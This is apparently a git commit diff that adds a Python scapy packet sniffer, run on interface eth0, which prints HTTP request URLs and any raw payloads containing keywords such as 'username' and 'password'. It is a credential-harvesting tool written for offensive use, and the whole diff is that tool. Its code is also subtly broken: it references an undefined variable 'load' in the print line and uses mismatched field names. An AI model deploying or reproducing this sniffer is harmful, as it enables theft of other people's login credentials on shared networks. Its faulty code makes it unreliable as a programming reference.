38a00da228064f38461a2711d894855178cd9e5d
root <root@kali.kali>
2022-06-19 00:18:58 +0400

    sniff sniff

--- sniffer.py
+++ sniffer.py
@@ -1,2 +1,32 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 import scapy.all as scapy
+from scapy.layers import http
+from scapy.layers.http import HTTPRequest
+
+def sniff(interface):
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+
+def get_url(packet):
+    return packet[http.HTTPRequest].HOST + packet[http.HTTPRequest].Path
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            keywords = ["username", "user", "login", "password", "pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    return load
+
+
+def process_sniffed_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print("[+] HTTP Request >> " + url)
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password > " + load + "\n\n")
+
+
+
+sniff("eth0")
